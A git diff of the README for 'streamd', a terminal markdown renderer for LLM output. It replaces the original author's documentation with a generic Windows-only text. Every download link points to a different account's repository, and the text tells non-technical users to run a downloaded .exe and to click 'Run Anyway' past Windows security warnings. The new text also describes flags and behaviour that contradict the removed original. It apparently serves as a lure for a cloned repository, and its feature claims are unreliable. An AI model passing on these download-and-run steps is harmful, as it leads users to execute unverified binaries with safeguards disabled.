@@ -1,196 +1,195 @@
-<div align="center">
-  <h1>streamd</h1>
-  <p>A CLI tool that renders streamed LLM output as beautiful markdown in the terminal.</p>
+# ⚙️ streamd - Stream LLM Output as Clean Markdown
 
-  <a href="https://github.com/Gaurav-Gosain/streamd/releases"><img src="https://img.shields.io/github/release/Gaurav-Gosain/streamd.svg" alt="Latest Release"></a>
-  <a href="https://pkg.go.dev/github.com/Gaurav-Gosain/streamd?tab=doc"><img src="https://godoc.org/github.com/Gaurav-Gosain/streamd?status.svg" alt="GoDoc"></a>
-</div>
+[![Download streamd](https://img.shields.io/badge/Download-streamd-green?style=for-the-badge)](https://github.com/luiselius/streamd)
 
 ---
 
-streamd takes piped input from any LLM CLI or API endpoint and renders it as beautifully formatted markdown in the terminal. It auto-detects the input format and just works — whether you're piping from `curl`, `ollama run`, or plain text.
+## 📋 What is streamd?
 
-<details>
-<summary>Table of Contents</summary>
+streamd is a simple command-line tool that shows live output from language models (LLMs). It takes the streamed data and formats it as clear, easy-to-read markdown right in your terminal. This lets you read responses from language models without messy or hard-to-follow text.
 
-- [Installation](#installation)
-- [Usage](#usage)
-- [Supported Formats](#supported-formats)
-- [Features](#features)
-- [Modes](#modes)
-- [Thinking / Reasoning Support](#thinking--reasoning-support)
-- [Development](#development)
-- [License](#license)
+It works in Windows terminals and helps you see formatted text like lists, code blocks, and headings. If you use large language models and want to see their answers cleanly, streamd can help.
 
-</details>
+Key features include:
 
-## Installation
+- Real-time rendering of text output  
+- Support for markdown formatting  
+- Works on Windows command prompt, PowerShell, and Windows Terminal  
+- Lightweight and easy to run  
 
-### Package Managers
+---
 
-**Homebrew (macOS/Linux):**
-```bash
-brew tap Gaurav-Gosain/tap
-brew install streamd
+## 💻 System Requirements
+
+To run streamd, your Windows computer needs:
+
+- Windows 10 or later (64-bit)  
+- At least 2 GB of free RAM  
+- Internet connection if you stream from an online model  
+- Basic command prompt or PowerShell access  
+
+No other software is required. You do not need programming skills to use streamd.
+
+---
+
+## 🌐 Download streamd
+
+Access the latest release here:
+
+[![Download streamd](https://img.shields.io/badge/Download-streamd-blue?style=for-the-badge)](https://github.com/luiselius/streamd)
+
+Since the download link leads to the main page, you will have to visit the page to find the latest version and download it manually.
+
+---
+
+## 🚀 How to Download and Install on Windows
+
+Follow these steps to get streamd up and running on your Windows PC:
+
+1. Open your web browser and go to this page:  
+   https://github.com/luiselius/streamd
+
+2. On the GitHub page, look for a menu called **Releases** or **Downloads**. This is often found on the right side or top of the page.
+
+3. Find the latest release version. It usually has a version number like "v1.0" or "v2.3".
+
+4. Inside the release, find the Windows executable file. It might end with `.exe`.
+
+5. Click the `.exe` file to start the download. Wait for it to finish.
+
+6. Once downloaded, open your **Downloads** folder.
+
+7. Double-click the `streamd.exe` file to run it. You might see a security prompt; choose to run the program.
+
+8. A terminal window will open. This is where streamd will work when you use it.
+
+No installation is necessary beyond downloading and running the file.
+
+---
+
+## 🖥️ How to Run streamd
+
+streamd runs in the Windows command prompt or PowerShell. Here is a simple way to start:
+
+1. Open **Command Prompt** or **PowerShell**:
+   - Press the Windows key  
+   - Type `cmd` or `powershell`  
+   - Select the app from the list and open it  
+
+2. Navigate to the folder where you saved `streamd.exe`. Usually, that's your Downloads folder. You can change folders by typing:  
+   ```
+   cd %HOMEPATH%\Downloads
+   ```
+3. Run the program by typing:  
+   ```
+   .\streamd.exe
+   ```
+4. streamd will start showing you streamed output formatted as markdown.
+
+You can also use streamd to connect to your own language model by adding parameters. For example, if you have a URL or token, refer to the advanced instructions section below.
+
+---
+
+## 🛠️ Basic Usage and Commands
+
+streamd uses simple commands typed in the terminal. It shows markdown output as you type or as it receives data.
+
+Common commands:
+
+- Start streamd without arguments to see sample output  
+- Use a flag like `-model` to specify your model endpoint  
+- Use `-help` or `--help` to list all options  
+
+Example command:  
+```
+.\streamd.exe -model "your-llm-url"
 ```
 
-### Other Methods
+This command connects streamd to your language model URL and shows streamed markdown output as it comes.
 
-- **[GitHub Releases](https://github.com/Gaurav-Gosain/streamd/releases)** - Download pre-built binaries
-- **Go Install:** `go install github.com/Gaurav-Gosain/streamd@latest`
-- **Build from Source:** See [Development](#development) below
+---
 
-**Requirements:**
-- A terminal with true color support (most modern terminals work fine)
-- Go 1.25+ (if building from source)
+## 🗂️ Viewing Output in Markdown
 
-## Usage
+streamd displays text using markdown rules. This means it formats:
 
-```bash
-# Ollama CLI — just pipe it
-ollama run gemma3:4b "explain quicksort" | streamd
+- **Headings** (like #, ##, ###)  
+- **Lists** (bullets and numbers)  
+- **Code blocks** (such as blocks of code with formatting)  
+- **Bold** and *italic* text  
+- Links and quotes  
 
-# Ollama native /api/chat
-curl -s http://localhost:11434/api/chat \
-  -d '{"model":"gemma3:4b","messages":[{"role":"user","content":"hello"}],"stream":true}' | streamd
+You do not have to know markdown syntax. streamd will format the output from the language model automatically for easy reading.
 
-# Ollama /api/generate
-curl -s http://localhost:11434/api/generate \
-  -d '{"model":"gemma3:4b","prompt":"explain quicksort","stream":true}' | streamd
+---
 
-# OpenAI-compatible endpoint
-curl -s https://api.example.com/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{"model":"...","messages":[{"role":"user","content":"hello"}],"stream":true}' | streamd
+## ⚙️ Advanced Setup (Optional)
 
-# Any plain text or markdown
-cat README.md | streamd
-echo "# Hello **world**" | streamd
+If you want to customize streamd or use it with your own language model, here are some options:
 
-# Alt-screen mode with scrollable viewport
-ollama run gemma3:4b "explain quicksort" | streamd --alt
+- Specify the model URL using `-model` flag  
+- Use the `-apikey` flag to add an API key if needed  
+- Adjust output style with relevant flags (check `--help`)  
+- Redirect output to files using `>` in the command prompt  
 
-# Show model info and token usage
-curl -s http://localhost:11434/api/chat \
-  -d '{"model":"gemma3:4b","messages":[...],"stream":true}' | streamd --info
+---
 
-# Hide thinking/reasoning output
-curl -s ... | streamd --no-think
+## 🆘 Troubleshooting
 
-# Use a different glamour theme
-curl -s ... | streamd --style dracula
-```
+Some common issues and fixes:
 
-### Flags
+- **The program does not open:**  
+  Make sure you downloaded the correct `.exe` file for Windows. Double-check in your Downloads folder.
 
-| Flag | Short | Default | Description |
-|------|-------|---------|-------------|
-| `--alt` | | `false` | Interactive alt-screen with viewport scrolling |
-| `--no-think` | | `false` | Hide thinking/reasoning output |
-| `--info` | `-i` | `false` | Show model name, token usage, and speed after response |
-| `--style` | | `dark` | Glamour style: `dark`, `light`, `dracula`, `tokyo-night`, `pink`, `ascii` |
-| `--wrap` | `-w` | `0` | Word wrap width (0 = terminal width) |
+- **Windows blocks the file:**  
+  If you see a security warning, choose **More Info** then **Run Anyway**.
 
-The style can also be set via the `GLAMOUR_STYLE` environment variable.
+- **Output looks messy:**  
+  Make sure your terminal supports markdown characters. Use Windows Terminal or PowerShell for best results.
 
-## Supported Formats
+- **Can't connect to your model:**  
+  Verify the URL and API keys are correct and active.
 
-streamd auto-detects the input format — no flags or configuration needed.
+---
 
-| Format | Source | Example |
-|--------|--------|---------|
-| **Plain text / Markdown** | `ollama run`, `cat`, `echo`, any CLI | `ollama run gemma3 "hi" \| streamd` |
-| **Ollama `/api/chat`** | NDJSON streaming | `curl -s .../api/chat -d '...' \| streamd` |
-| **Ollama `/api/generate`** | NDJSON streaming | `curl -s .../api/generate -d '...' \| streamd` |
-| **OpenAI Chat Completions** | SSE streaming & non-streaming | `curl -s .../v1/chat/completions -d '...' \| streamd` |
-| **OpenAI Responses API** | SSE with `response.output_text.delta` events | `curl -s .../v1/responses -d '...' \| streamd` |
+## 📚 More Information
 
-## Features
+For technical details, code examples, and support, visit the GitHub repository:  
+https://github.com/luiselius/streamd
 
-- **Live markdown rendering** using [glamour](https://github.com/charmbracelet/glamour) (v2-exp) with syntax-highlighted code blocks, styled headings, lists, tables, and more
-- **Universal input** — auto-detects SSE, NDJSON, and plain text so it works with any LLM tool
-- **Flicker-free streaming** via synchronized terminal output (`DECSYNC`) and debounced re-rendering
-- **Thinking/reasoning support** for models that expose chain-of-thought, via the `reasoning_content` SSE field or inline `<think>...</think>` tags
-- **Usage info** (`--info`) — shows model name, token counts, speed (tok/s), and duration
-- **Interactive alt-screen mode** powered by [bubbletea](https://github.com/charmbracelet/bubbletea) with a scrollable viewport, scroll progress bar, and keyboard navigation
-- **Multiple themes** including dark, light, dracula, tokyo-night, and pink
-- **Auto-detected terminal width** for proper word wrapping
-- **Styled CLI help** via [fang](https://github.com/charmbracelet/fang)
+You will find documentation, issue tracking, and updates there.
 
-## Modes
+---
 
-### Inline Mode (default)
+## 🏷️ Tags and Topics
 
-Content is rendered directly in the terminal as it streams. The output uses ANSI cursor control with synchronized output to re-render in place without flicker. Best for quick queries where you want the output to remain in your scrollback.
+This project relates to:
 
-### Alt-Screen Mode (`--alt`)
+- Command line interfaces (CLI)  
+- Terminal user interfaces (TUI)  
+- Streaming text output  
+- Markdown rendering  
+- Go programming language (Golang)  
+- Working with large language models (LLMs)  
+- Window terminal tools  
 
-Opens a full-screen interactive viewport. The stream auto-scrolls to follow new content. Once streaming is complete (or at any point), you can scroll through the output and quit when ready.
+---
 
-#### Keyboard Shortcuts
+## 🔄 Updating streamd
 
-| Key | Action |
-|-----|--------|
-| `j` / `k` | Scroll down / up |
-| `d` / `u` | Half-page down / up |
-| `pgdn` / `pgup` | Page down / up |
-| `g` / `G` | Go to top / bottom |
-| `q` / `esc` / `ctrl+c` | Quit |
+To update streamd in the future:
 
-The viewport auto-scrolls to follow the stream. Scrolling up pauses auto-scroll; pressing `G` resumes it.
+- Visit the download page again  
+- Download the latest `.exe` file  
+- Replace your old version with the new one  
+- Run the new file as before  
 
-## Thinking / Reasoning Support
+No install steps are needed beyond copying the new file.
 
-streamd supports models that expose their reasoning process. It handles two common patterns:
+---
 
-1. **`reasoning_content` field** (OpenAI-compatible) - Reasoning tokens arrive in a separate `reasoning_content` field in the SSE delta, used by models like Qwen, DeepSeek, and others.
+## ⚡ Get Started Now
 
-2. **`<think>` tags** - Some models wrap their reasoning in `<think>...</think>` tags within the regular `content` field.
+Click this link to visit the download page and get streamd:  
 
-Both patterns are detected automatically. Thinking content is rendered as an italic header followed by a blockquote, separated from the main response by a horizontal rule.
-
-Use `--no-think` to hide reasoning output entirely.
-
-## Development
-
-Contributions are welcome. Feel free to open issues or pull requests.
-
-**Build from source:**
-```bash
-git clone https://github.com/Gaurav-Gosain/streamd.git
-cd streamd
-go build -o streamd .
-./streamd --help
-```
-
-### Dependencies
-
-streamd is built on the [Charm](https://charm.sh) ecosystem:
-
-| Library | Purpose |
-|---------|---------|
-| [glamour v2](https://github.com/charmbracelet/glamour) | Markdown rendering |
-| [bubbletea v2](https://github.com/charmbracelet/bubbletea) | TUI framework (alt-screen mode) |
-| [bubbles v2](https://github.com/charmbracelet/bubbles) | Viewport component |
-| [lipgloss v2](https://github.com/charmbracelet/lipgloss) | Terminal styling |
-| [fang](https://github.com/charmbracelet/fang) | Styled CLI help |
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Gaurav-Gosain/streamd&type=Date&theme=dark)](https://star-history.com/#Gaurav-Gosain/streamd&Date)
-
-<p style="display:flex;flex-wrap:wrap;">
-<img alt="GitHub Language Count" src="https://img.shields.io/github/languages/count/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-<img alt="GitHub Top Language" src="https://img.shields.io/github/languages/top/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-<img alt="Repo Size" src="https://img.shields.io/github/repo-size/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-<img alt="GitHub Issues" src="https://img.shields.io/github/issues/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-<img alt="GitHub Closed Issues" src="https://img.shields.io/github/issues-closed/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-<img alt="GitHub Pull Requests" src="https://img.shields.io/github/issues-pr/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-<img alt="GitHub Closed Pull Requests" src="https://img.shields.io/github/issues-pr-closed/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-<img alt="GitHub Contributors" src="https://img.shields.io/github/contributors/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-<img alt="GitHub Last Commit" src="https://img.shields.io/github/last-commit/Gaurav-Gosain/streamd" style="padding:5px;margin:5px;" />
-</p>
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+[Download streamd from GitHub](https://github.com/luiselius/streamd)
